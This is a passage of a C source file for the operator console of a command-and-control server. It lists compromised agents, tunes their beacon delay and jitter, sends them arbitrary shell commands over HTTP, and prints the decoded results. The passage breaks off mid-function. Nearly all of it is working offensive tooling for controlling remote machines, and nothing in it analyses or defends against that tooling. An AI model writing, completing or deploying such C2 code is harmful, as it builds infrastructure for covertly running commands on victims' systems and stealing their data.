#include "jansson.h"
#include "curl/curl.h"
#include <stdlib.h>
#include <stdio.h>
#include <regex.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>

#define SERVER_NAME_SIZE 256 //max size of <server-name/ip>:<port> and the null byte
#define BUFSIZE 1024
#define PROMPT_STR "c2-server$ "
#define PROMPT_STR_LIST "c2-server/list$ "

const int req_retries = 5;
struct timespec req_wait = {
    .tv_sec = 2,
    .tv_nsec = 0
};

struct response_buf {
    char *response;
    size_t size;
};

enum menu_states {
    //server connect menu, can't be backtracked to, should restart program
    NOTHING,
    SELECT_AGENT_MENU,
    LIST_AGENT_SUBMENU,
    CTRL_AGENT_MENU
};



struct agent_info {
    char *id;
    char *handle;
};
char *server_connect(CURL *curl);
int select_agent_menu(CURL *curl, struct agent_info *agent, const char *base_url);
int list_agents(CURL *curl, struct agent_info *agent, const char *agents_url);
int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_url);
int ping_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches);
int conf_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches);
int cmd_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches);
int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_id, int retries);
unsigned char *base64_decode(const unsigned char *data, size_t *outbytes, int *error);
static inline void print_inv_cmd(void);
static inline void print_help(int menu_state);
static inline void trim_spaces(char **);
int set_http_headers(struct curl_slist **slist_ptr, int argc, ...);
size_t write_cb(char *data, size_t size, size_t nmemb, void *buf);

int main(void){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    int rc;
    CURLcode rc_curl;
    char *base_url;
    CURL *curl = curl_easy_init();
    if (!curl) {
        exit(EXIT_FAILURE);
    }
    base_url = server_connect(curl);
    if (!base_url) {
        curl_easy_cleanup(curl);
        exit(EXIT_FAILURE);
    } //cleanups: curl, base_url
    //connected successfully

    struct agent_info *agent = malloc(sizeof(struct agent_info));
    if (!agent) {
        curl_easy_cleanup(curl);
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    memset(agent, 0, sizeof(struct agent_info));
    //always set to zero one done with it
    int menu_state = NOTHING;
    while (1) {
        if (agent->id == (void *)0) {
            rc = select_agent_menu(curl, agent, base_url);
            if (rc == -1) {
                free(agent);
                curl_easy_cleanup(curl);
                exit(EXIT_FAILURE);
            }
            //else 0
        }
        else {
            rc = control_agent_menu(curl, agent, base_url);
            if (rc == -1) {
                free(agent);
                curl_easy_cleanup(curl);
                exit(EXIT_FAILURE);
            }
        }
    }
}

char *server_connect(CURL *curl) {
    CURLcode rc_curl;
    long http_code;
    printf("enter <server-name/IP>:<port-no> to connect: ");
    char buf[SERVER_NAME_SIZE];
    char *url = malloc(SERVER_NAME_SIZE + 16); /* extra space for http:/// */
    if (!url) {
        perror("malloc");
        return (void *)NULL;
    }
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = '\0';
    sprintf(url,"http://%s/", buf);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
    struct response_buf response_buf = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    rc_curl = curl_easy_perform(curl);
    if (rc_curl != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
        return (void *)NULL;
    }
    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 0);
    curl_easy_reset(curl); //reset after each request
    printf("status code: %ld\n", http_code);
    if (http_code != 200) {
        fprintf(stderr, "failed: status code of 200 was expected\n");
        free(response_buf.response);
        return (void *)NULL;
    }
    fwrite(response_buf.response, 1, response_buf.size, stdout);
    free(response_buf.response);
    printf("connected to the server successfully.\n");
    return url;
}

static inline void print_inv_cmd(void) {
    printf("\ninvalid command\n");
    printf("type ? to see available commands\n");
}

static inline void print_help(int menu_state) {
    printf("available commands:\n");
    switch (menu_state) {
        case NOTHING:
            break; //probably remove this state
        case SELECT_AGENT_MENU: {
            printf("list: list agents\n");
            printf("\t-h [HANDLE]: list agent(s) with that handle\n");
            printf("results: see all completed tasks and their results\n");
            printf("\t-o: redirect to an output file (not implemented)\n");
            break;
        }
        case LIST_AGENT_SUBMENU: {
            printf("[#]: select an agent\n");
            printf("back: go to previous menu\n");
            break;
        }
        case CTRL_AGENT_MENU: {
            printf("[supported task]: submit a task for the agent. listed below\n");
            printf("\t-q: quiet, don't print the task result\n");
            //printf("\t-o: redirect the task result to an output file\n");
            printf("\tping: ping agent\n");
            printf("\tconf [option]: configure agent\n");
            printf("\t\tdelay [xx]s[xx]ns: set mean delay\n");
            printf("\t\tjitter [xx]s[xx]ns: set maximum jitter\n");
            printf("\tcmd [command]: issue the agent a shell command. "
                   "-q should come before the command.\n");
            printf("results: see all completed tasks of this agent and their results\n");
            printf("\t-o: redirect to an output file (not implemented)\n");
            printf("back: go to previous menu\n");
            break;
        }
        default:{}
    }
    printf("?: help\n");
}
int select_agent_menu(CURL *curl, struct agent_info *agent, const char *base_url) {
    printf("(type ? to see available commands)\n");
    char buf_array[BUFSIZE];
    char *buf = buf_array; //because the pointer needs to mutable
    while (1) {
        printf("\n"PROMPT_STR);
        if (fgets(buf, BUFSIZE, stdin) == NULL) {
            return -1;
        }
        trim_spaces(&buf); //pushes buf past the starting newline
        //and spaces, and puts null where the first trailing space/newline is
        if (*buf == '\0')
            continue;

        else if (*buf == '?' && *(buf+1) == '\0') {
            print_help(SELECT_AGENT_MENU);
            continue;
        }
        else if (strncmp(buf, "list", 4) == 0){
            char *options = buf + 4; //push it past "list"
            trim_spaces(&options);
            char *agents_url;
            if (*options == '\0') {
                //list all agents
                agents_url = malloc(strlen(base_url) + 6 + 1); //strlen("agents") + '\0'
                if (!agents_url) {
                    perror("malloc");
                    return -1;
                }
                sprintf(agents_url, "%sagents",base_url);
            }
            else if (strncmp(options, "-h", 2) == 0) {
                options+=2;
                char *handle = malloc(strlen(options) + 1);
                if (sscanf(options, " %s", handle) != 1) {
                    free(handle);
                    print_inv_cmd();
                    continue;
                }
                agents_url = malloc(strlen(base_url) + 6 + 8 + strlen(handle) + 1);
                //strlen of "agents" + "?handle=" + '\0'
                if (!agents_url) {
                    perror("malloc");
                    return -1;
                }
                sprintf(agents_url, "%sagents?handle=%s", base_url, handle);
            }
            else {
                print_inv_cmd();
                continue;
            } //agents_url is ready, curl request can be sent agnostically
            int rc = list_agents(curl, agent, agents_url);
            free(agents_url);
            return rc; //if rc = -1 the main loop will clean up and exit
            //else it will return 0, either user has called "back" or list was empty
            //in which case agent struct will be empty and this funciton will be called again
            //otherwise agent won't be null and will contain valid agent data
        }

        else if (strncmp(buf, "results", 7) == 0) {
            //should add check for -o switch and output redirection
            int rc = print_results(curl, base_url, (void *)NULL, (void *)NULL, 0); //agent_id and task_id
            if (rc == -1)
                return rc; //main loop clean up and exit
            continue;
        }
        else
            print_inv_cmd();
    }
}

int list_agents(CURL *curl, struct agent_info *agent, const char *agents_url) {
    CURLcode rc_curl;
    long http_code;
    curl_easy_setopt(curl, CURLOPT_URL, agents_url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
    struct response_buf response_buf = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    rc_curl = curl_easy_perform(curl);
    if (rc_curl != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
        return -1;
    }
    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 0);
    curl_easy_reset(curl);
    if (http_code != 200) {
        fprintf(stderr, "failed: status code of 200 was expected\n");
        free(response_buf.response);
        return -1;
    }
    //fwrite(response_buf.response, 1, response_buf.size, stdout);
    json_error_t error;
    json_t *agents_arr = json_loadb(response_buf.response, response_buf.size,
        0, &error);
    free(response_buf.response);
    if (!agents_arr) {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n", error.line, error.text);
        return -1;
    } //need to decref arr
    if (json_array_size(agents_arr) == 0) {
        printf("list is empty: couldn't fetch any agents\n");
        json_decref(agents_arr);
        return 0; //go back to select agents from main loop
    }
    size_t index;
    json_t *task_obj;
    json_array_foreach(agents_arr, index, task_obj) {
        printf("%zu)", index);
        char *str = json_dumps(task_obj, 0);
        printf("%s\n", str);
        free(str);
    }
    printf("select an agent by its index\n");
    char buf_array[BUFSIZE];
    char *buf = buf_array;
    while (1) {
        printf("\n"PROMPT_STR_LIST);
        if (fgets(buf, BUFSIZE, stdin) == NULL) {
            json_decref(agents_arr);
            return -1;
        }
        trim_spaces(&buf);
        if (*buf == '\0')
            continue;
        else if (*buf == '?' && *(buf+1) == '\0') {
            print_help(LIST_AGENT_SUBMENU);
            continue;
        }
        else if (strcmp(buf, "back") == 0) {
            json_decref(agents_arr);
            return 0; //agent is still set to zero so main will call select agent
        }
        else {
            char *endptr;
            //errno = 0; no need to handle ERANGE really
            long num = strtoll(buf, &endptr, 10);
            if (endptr == buf || *endptr != '\0')
            {
                print_inv_cmd();
                continue;
            }
            if (num < 0) {
                printf("enter a positive index.\n");
                continue;
            }
            index = num;
            if (index >= json_array_size(agents_arr)) {
                printf("index out of range");
                continue;
            } //valid index:
            json_t *agent_obj = json_array_get(agents_arr, index);
            //if (!agent_obj){json_decref(agents_arr); return -1;}
            char *id, *handle;
            if (json_unpack(agent_obj, "{s:s, s:s}", "uuid", &id, "handle", &handle) == -1) {
                fprintf(stderr, "json_unpack: failed to unpack agent object\n");
                json_decref(agents_arr);
                return -1;
            }
            agent->id = strdup(id);
            if (!agent->id) {
                perror("strdup");
                json_decref(agents_arr);
                return -1;
            }
            agent->handle = strdup(handle);
            if (!agent->handle) {
                perror("strdup");
                json_decref(agents_arr);
                free(agent->id);
                return -1;
            }
            printf("agent %s selected successfully.\n", agent->handle);
            json_decref(agents_arr);
            return 0;
        }
    }
}

int control_agent_menu(CURL *curl, struct agent_info *agent, const char *base_url) {
    int rc;
    char *prompt_str = malloc(strlen(agent->handle) + 3); //$-space-nullbyte
    sprintf(prompt_str, "%s$ ", agent->handle);
    char buf_array[BUFSIZE];
    char *buf = buf_array; //because the pointer needs to mutable
    while (1) {
        printf("\n%s", prompt_str);
        if (fgets(buf, BUFSIZE, stdin) == NULL) {
            return -1;
        }
        trim_spaces(&buf); //pushes buf past the starting newline
        //and spaces, and puts null where the first trailing space/newline is
        if (*buf == '\0')
            continue;
        if (*buf == '?' && *(buf+1) == '\0') {
            print_help(CTRL_AGENT_MENU);
            continue;
        }
        if (strcmp(buf, "back") == 0) {
            free(agent->handle);
            free(agent->id);
            memset(agent, 0, sizeof(struct agent_info));
            return 0;
        }
        if (strncmp(buf, "ping", 4) == 0) {
            buf+=4;
            rc = ping_task(curl, agent, base_url, buf);
            if (rc == -1) {
                free(agent->handle);
                free(agent->id);
                return -1;
            }
            continue;
        }
        if (strncmp(buf, "conf", 4) == 0) {
            buf+=4;
            rc = conf_task(curl, agent, base_url, buf);
            if (rc == -1) {
                free(agent->handle);
                free(agent->id);
                return -1;
            }
            continue;
        }
        if (strncmp(buf, "cmd", 3) == 0) {
            buf+=3;
            rc = cmd_task(curl, agent, base_url, buf);
            if (rc == -1) {
                free(agent->handle);
                free(agent->id);
                return -1;
            }
            continue;
        }
        if (strncmp(buf, "results", 7) == 0) {
            rc = print_results(curl, base_url, agent->id, (void *)NULL, 0);
            if (rc == -1) {
                free(agent->handle);
                free(agent->id);
                return -1;
            }
            continue;
        }
        print_inv_cmd(); //none of the above
    }

}
int ping_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches) {
    int quiet = 0;
    if (*switches != '\0') {
        trim_spaces(&switches);
        if (strcmp(switches, "-q") == 0)
            quiet = 1;
        else {
            print_inv_cmd();
            return 0;
        }
    }
    json_t *post_json = json_pack("{s:s, s:s, s:{}}",
        "category", "ping", "agent_id", agent->id, "options");
    if (!post_json) {
        fprintf(stderr, "json_pack failed\n");
        return -1;
    }
    char *post_str = json_dumps(post_json, 0);
    json_decref(post_json);
    if (!post_str) {
        fprintf(stderr, "json_dumps failed\n");
        return -1;
    } //ready to send the request
    CURLcode rc_curl;
    long http_code;
    char *tasks_url = malloc(strlen(base_url) + 5 + 1); //strlen("tasks") + '\0'
    if (!tasks_url) {
        perror("malloc");
        free(post_str);
        return -1;
    }
    sprintf(tasks_url, "%stasks",base_url);
    curl_easy_setopt(curl, CURLOPT_URL, tasks_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    struct response_buf response_buf = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_str);
    //curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(post_str));
    struct curl_slist *headers = (void *)NULL;
    if (set_http_headers(&headers, 1, "Content-Type: application/json")) {
        fprintf(stderr, "set_http_headers failed\n");
        free(post_str);
        free(tasks_url);
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    rc_curl = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    free(post_str);
    free(tasks_url);
    if (rc_curl != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
        //if (rc_curl == CURLE_COULDNT_CONNECT)
        //    return 0;
        return -1;
    }
    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_setopt(curl, CURLOPT_POST, 0);
    curl_easy_reset(curl);
    if (http_code != 200) {
        fprintf(stderr, "status code: %ld\n", http_code);
        fprintf(stderr, "failed: status code of 200 was expected\n");
        free(response_buf.response);
        return -1;
    } //request was successful
    if (quiet == 1) {
        free(response_buf.response);
        return 0;
    }
    //probing for task result
    json_error_t jerror;
    json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
    free(response_buf.response);
    if (!root)
    {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n",
            jerror.line, jerror.text);
        return -1;
    }
    char *task_id;
    if (json_unpack(root, "{s:s}", "uuid", &task_id) == -1) {
        fprintf(stderr, "json_unpack failed\n");
        json_decref(root);
        return -1;
    }
    return print_results(curl, base_url, (void *)NULL, task_id, req_retries);
}

int conf_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches) {
    int quiet = 0;
    long ds = 0, dns = 0, js = 0, jns = 0; //delay jitter second nanosecond
    char *qneedle = strstr(switches, "-q");
    if (qneedle) {
        quiet = 1;
        memset(qneedle, ' ', 2); //replace "-q" with spaces
    }
    char *dneedle = strstr(switches, "delay");
    if (dneedle) {
        char *p = dneedle + 5; //strlen("delay")
        char *endptr;
        errno = 0;
        ds = strtol(p, &endptr, 10);
        if (p == endptr || *endptr != 's' || ds < 0)
        {
            print_inv_cmd();
            return 0;
        }
        if (ds == LONG_MAX && errno == ERANGE) {
            printf("number out of range.\n");
            return 0;
        } //ds is valid
        p = endptr + 1; //skipping 's'
        errno = 0;
        dns = strtol(p, &endptr, 10);
        if (p == endptr || *endptr++ != 'n' || *endptr != 's' || dns < 0)
        {
            print_inv_cmd();
            return 0;
        }
        if (dns == LONG_MAX && errno == ERANGE) {
            printf("number out of range.\n");
            return 0;
        } //dns is valid. endptr is pointing at the final parse character
        memset(dneedle, ' ', (endptr - dneedle) + 1);
    }
    char *jneedle = strstr(switches, "jitter");
    if (jneedle) {
        char *p = jneedle + 6; //strlen("jitter")
        char *endptr;
        errno = 0;
        js = strtol(p, &endptr, 10);
        if (p == endptr || *endptr != 's' || js < 0)
        {
            print_inv_cmd();
            return 0;
        }
        if (js == LONG_MAX && errno == ERANGE) {
            printf("number out of range.\n");
            return 0;
        } //js is valid
        p = endptr + 1; //skipping 's'
        errno = 0;
        jns = strtol(p, &endptr, 10);
        if (p == endptr || *endptr++ != 'n' || *endptr != 's' || jns < 0)
        {
            print_inv_cmd();
            return 0;
        }
        if (jns == LONG_MAX && errno == ERANGE) {
            printf("number out of range.\n");
            return 0;
        } //jns is valid. endptr is pointing at the final parse character
        memset(jneedle, ' ', (endptr - jneedle) + 1);
    }
    trim_spaces(&switches); //must be all spaces if input was valid
    if (*switches != '\0') {
        print_inv_cmd();
        return 0;
    }
    if (!dneedle && !jneedle) {
        printf("must set at least set one of delay and jitter\n");
        return 0;
    }
    json_t *post_json;
    if (dneedle && !jneedle) {
        post_json = json_pack("{s:s, s:s, s:{s:{s:I, s:I}}}",
            "category", "conf", "agent_id", agent->id,
            "options",
                "delay",
                    "s", ds, "ns", dns);
    }
    else if (!dneedle && jneedle) {
        post_json = json_pack("{s:s, s:s, s:{s:{s:I, s:I}}}",
            "category", "conf", "agent_id", agent->id,
            "options",
                "jitter",
                    "s", js, "ns", jns);
    }
    else { //(dneedle && jneedle)
        post_json = json_pack("{s:s, s:s, s:{s:{s:I, s:I}, s:{s:I, s:I}}}",
            "category", "conf", "agent_id", agent->id,
            "options",
                "delay",
                    "s", ds, "ns", dns,
                "jitter",
                    "s", js, "ns", jns);
    }
    if (!post_json) {
        fprintf(stderr, "json_pack failed\n");
        return -1;
    }
    char *post_str = json_dumps(post_json, 0);
    json_decref(post_json);
    if (!post_str) {
        fprintf(stderr, "json_dumps failed\n");
        return -1;
    } //ready to send the request
    CURLcode rc_curl;
    long http_code;
    char *tasks_url = malloc(strlen(base_url) + 5 + 1); //strlen("tasks") + '\0'
    if (!tasks_url) {
        perror("malloc");
        free(post_str);
        return -1;
    }
    sprintf(tasks_url, "%stasks",base_url);
    curl_easy_setopt(curl, CURLOPT_URL, tasks_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    struct response_buf response_buf = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_str);
    struct curl_slist *headers = (void *)NULL;
    if (set_http_headers(&headers, 1, "Content-Type: application/json")) {
        fprintf(stderr, "set_http_headers failed\n");
        free(post_str);
        free(tasks_url);
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    rc_curl = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    free(post_str);
    free(tasks_url);
    if (rc_curl != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
        return -1;
    }
    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_setopt(curl, CURLOPT_POST, 0);
    curl_easy_reset(curl);
    if (http_code != 200) {
        fprintf(stderr, "status code: %ld\n", http_code);
        fprintf(stderr, "failed: status code of 200 was expected\n");
        free(response_buf.response);
        return -1;
    } //request was successful
    if (quiet == 1) {
        free(response_buf.response);
        return 0;
    }
    //fwrite(response_buf.response, response_buf.size, 1, stdout);
    json_error_t jerror;
    json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
    free(response_buf.response);
    if (!root)
    {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n",
            jerror.line, jerror.text);
        return -1;
    }
    char *task_id;
    if (json_unpack(root, "{s:s}", "uuid", &task_id) == -1) {
        fprintf(stderr, "json_unpack failed\n");
        json_decref(root);
        return -1;
    }
    return print_results(curl, base_url, (void *)NULL, task_id, req_retries);
}

int cmd_task(CURL *curl, struct agent_info *agent, const char *base_url, char *switches) {
    int quiet = 0;
    trim_spaces(&switches);
    if (switches[0] == '-' && switches[1] == 'q') {
        switches += 2; //skip -q
        if (*switches != ' ' && *switches != '\t' && *switches != '\n') {
            print_inv_cmd();
            return 0;
        }
        quiet = 1;
        trim_spaces(&switches);
    }
    if (*switches == '\0') {
        print_inv_cmd();
        return 0;
    } //cmd_str exists
    char *cmd_str = switches;
    json_t *post_json = json_pack("{s:s, s:s, s:{s:s}}",
        "category", "cmd", "agent_id", agent->id,
        "options",
            "cmd_str", cmd_str);
    if (!post_json) {
        fprintf(stderr, "json_pack failed\n");
        return -1;
    }
    char *post_str = json_dumps(post_json, 0);
    json_decref(post_json);
    if (!post_str) {
        fprintf(stderr, "json_dumps failed\n");
        return -1;
    } //ready to send the request
    CURLcode rc_curl;
    long http_code;
    char *tasks_url = malloc(strlen(base_url) + 5 + 1); //strlen("tasks") + '\0'
    if (!tasks_url) {
        perror("malloc");
        free(post_str);
        return -1;
    }
    sprintf(tasks_url, "%stasks",base_url);
    curl_easy_setopt(curl, CURLOPT_URL, tasks_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    struct response_buf response_buf = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_str);
    struct curl_slist *headers = (void *)NULL;
    if (set_http_headers(&headers, 1, "Content-Type: application/json")) {
        fprintf(stderr, "set_http_headers failed\n");
        free(post_str);
        free(tasks_url);
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    rc_curl = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    free(post_str);
    free(tasks_url);
    if (rc_curl != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
        return -1;
    }
    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_setopt(curl, CURLOPT_POST, 0);
    curl_easy_reset(curl);
    if (http_code != 200) {
        fprintf(stderr, "status code: %ld\n", http_code);
        fprintf(stderr, "failed: status code of 200 was expected\n");
        free(response_buf.response);
        return -1;
    } //request was successful
    if (quiet == 1) {
        free(response_buf.response);
        return 0;
    }
    json_error_t jerror;
    json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
    free(response_buf.response);
    if (!root)
    {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n",
            jerror.line, jerror.text);
        return -1;
    }
    char *task_id;
    if (json_unpack(root, "{s:s}", "uuid", &task_id) == -1) {
        fprintf(stderr, "json_unpack failed\n");
        json_decref(root);
        return -1;
    }
    return print_results(curl, base_url, (void *)NULL, task_id, req_retries);
}

int print_results(CURL *curl, const char *base_url, char *agent_id, char *task_id, int retries) {
    CURLcode rc_curl;
    long http_code;
    char *results_url;
    if (task_id) {
        results_url = malloc(strlen(base_url) + 7 + 9 + 36 + 1);
        //<base_url>results?task-id=<uuid>'\0'
        sprintf(results_url, "%sresults?task-id=%s", base_url, task_id);
    }
    else if (agent_id) {
        results_url = malloc(strlen(base_url) + 7 + 10 + 36 + 1);
        //<base_url>results?agent-id=<uuid>'\0'
        sprintf(results_url, "%sresults?agent-id=%s", base_url, agent_id);
    }
    else {
        results_url = malloc(strlen(base_url) + 7 + 1);
        //<base_url>results'\0'
        sprintf(results_url, "%sresults", base_url);
    }
    curl_easy_setopt(curl, CURLOPT_URL, results_url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1);
    struct response_buf response_buf = {0};
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response_buf);
    rc_curl = curl_easy_perform(curl);
    free(results_url);
    if (rc_curl != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
        return -1;
    }
    curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 0);
    curl_easy_reset(curl);
    if (http_code != 200) {
        fprintf(stderr, "failed: status code of 200 was expected\n");
        free(response_buf.response);
        return -1;
    }
    //fwrite(response_buf.response, 1, response_buf.size, stdout);
    json_error_t jerror;
    json_t *res_arr = json_loadb(response_buf.response, response_buf.size,
        0, &jerror);
    free(response_buf.response);
    if (!res_arr) {
        fprintf(stderr, "syntax error in json message: line %d, error %s\n", jerror.line, jerror.text);
        return -1;
    } //need to decref arr
    if (json_array_size(res_arr) == 0) {
        json_decref(res_arr);
        if (task_id) { //called from task handlers directly
            //we don't expect the task result to return immediately
            if (retries > 0) {
                clock_nanosleep(CLOCK_MONOTONIC, 0, &req_wait, (void *)NULL);
                return print_results(curl, base_url, agent_id, task_id, (retries - 1));
            } //else retries hits zero, we return empty
        }
        printf("list is empty: couldn't fetch result(s)\n");
        return 0;
    } //array isn't empty:
    printf("\n");
    size_t index;
    json_t *task_obj;
    json_array_foreach(res_arr, index, task_obj) {
        char *category, *cur_agent_id, *options_str, *result_str;
        int queue_no;
        if (task_id) {
            if (json_unpack(task_obj, "{s:s}", "result", &result_str) == -1) {
                fprintf(stderr, "json_unpack failed\n");
                json_decref(res_arr);
                return -1;
            }
            json_t *result_obj = json_loads(result_str, 0, (void *)NULL); //new ref
            if (!json_is_object(result_obj)) {
                fprintf(stderr, "json_loads failed\n");
                json_decref(res_arr);
                return -1;
            }
            char *error = (char *)0, *type = (char *)0, *data = (char *)0;
            if (json_unpack(result_obj, "{s?s, s?s, s?s}",
                "error", &error, "type", &type, "data", &data) == -1) {
                fprintf(stderr, "json_unpack failed\n");
                json_decref(result_obj);
                json_decref(res_arr);
                return -1;
            }
            if (error) {
                fprintf(stdout, "error: %s\n", error);
            }
            else if (type && data) {
                if (strcmp(type, "b64") == 0) {
                    size_t outbytes;
                    int b64err;
                    unsigned char *decode = base64_decode((unsigned char *)data, &outbytes, &b64err);
                    if (!decode) {
                        switch (b64err) {
                            case -1: {
                                json_decref(result_obj);
                                json_decref(res_arr);
                                return -1;
                            }
                            case 0: {
                                fprintf(stdout, "result type: %s, result data is empty\n", type);
                            }
                        }
                    }
                    else {
                        fprintf(stdout, "result type: %s, result data:\n", type);
                        fwrite(decode, outbytes, 1, stdout);
                    }
                } //assuming type is text, not binary:
                else {
                    fprintf(stdout, "result type: %s, result data: %s\n", type, data);
                }
            }
            else {
                fprintf(stdout, "couldn't parse result.\n");
            }
            json_decref(result_obj);
        }
        else if (agent_id) {
            if (json_unpack(task_obj, "{s:s, s:s, s:i, s:s}",
                "category", &category, "options", &options_str,
                "queue_no", &queue_no, "result", &result_str) == -1) {
                fprintf(stderr, "json_unpack failed\n");
                json_decref(res_arr);
                return -1;
            }
            fprintf(stdout, "task %zu)\n", index);
            fprintf(stdout, "category: %s\noptions: %s\nqueue-no: %d\n",
                category, options_str, queue_no);
            //unpacking and displaying the result:
            json_t *result_obj = json_loads(result_str, 0, (void *)NULL); //new ref
            if (!json_is_object(result_obj)) {
                fprintf(stderr, "json_loads failed\n");
                json_decref(res_arr);
                return -1;
            }
            char *error = (char *)0, *type = (char *)0, *data = (char *)0;
            if (json_unpack(result_obj, "{s?s, s?s, s?s}",
                "error", &error, "type", &type, "data", &data) == -1) {
                fprintf(stderr, "json_unpack failed\n");
                json_decref(result_obj);
                json_decref(res_arr);
                return -1;
                }
            if (error) {
                fprintf(stdout, "error: %s\n", error);
            }
            else if (type && data) {
                if (strcmp(type, "b64") == 0) {
                    size_t outbytes;
                    int b64err;
                    unsigned char *decode = base64_decode((unsigned char *)data, &outbytes, &b64err);
                    if (!decode) {
                        switch (b64err) {
                            case -1: {
                                json_decref(result_obj);
                                json_decref(res_arr);
                                return -1;
                            }
                            case 0: {
                                fprintf(stdout, "result type: %s, result data is empty\n", type);
                            }
                        }
                    }
                    else {
                        fprintf(stdout, "result type: %s, result data:\n", type);
                        fwrite(decode, outbytes, 1, stdout);
                    }
                } //assuming type is text, not binary:
                else {
                    fprintf(stdout, "result type: %s, result data: %s\n", type, data);
                }
            }
            else {
                fprintf(stdout, "couldn't parse result.\n");
            }
            json_decref(result_obj);
        }
        else {//(!agent_id && !task_id)
            //display each tasks' agent id as well
            if (json_unpack(task_obj, "{s:s, s:s, s:s, s:i, s:s}",
                "category", &category, "options", &options_str, "agent_id", &cur_agent_id,
                "queue_no", &queue_no, "result", &result_str) == -1) {
                fprintf(stderr, "json_unpack failed\n");
                json_decref(res_arr);
                return -1;
                }
            fprintf(stdout, "task %zu)\n", index);
            fprintf(stdout, "agent-id: %s\ncategory: %s\noptions: %s\nqueue-no: %d\n",
                cur_agent_id, category, options_str, queue_no);
            //unpacking and displaying the result:
            json_t *result_obj = json_loads(result_str, 0, (void *)NULL); //new ref
            if (!json_is_object(result_obj)) {
                fprintf(stderr, "json_loads failed\n");
                json_decref(res_arr);
                return -1;
            }
            char *error = (char *)0, *type = (char *)0, *data = (char *)0;
            if (json_unpack(result_obj, "{s?s, s?s, s?s}",
                "error", &error, "type", &type, "data", &data) == -1) {
                fprintf(stderr, "json_unpack failed\n");
                json_decref(result_obj);
                json_decref(res_arr);
                return -1;
                }
            if (error) {
                fprintf(stdout, "error: %s\n", error);
            }
            else if (type && data) {
                if (strcmp(type, "b64") == 0) {
                    size_t outbytes;
                    int b64err;
                    unsigned char *decode = base64_decode((unsigned char *)data, &outbytes, &b64err);
                    if (!decode) {
                        switch (b64err) {
                            case -1: {
                                json_decref(result_obj);
                                json_decref(res_arr);
                                return -1;
                            }
                            case 0: {
                                fprintf(stdout, "result type: %s, result data is empty\n", type);
                            }
                        }
                    }
                    else {
                        fprintf(stdout, "result type: %s, result data:\n", type);
                        fwrite(decode, outbytes, 1, stdout);
                    }
                } //assuming type is text, not binary:
                else {
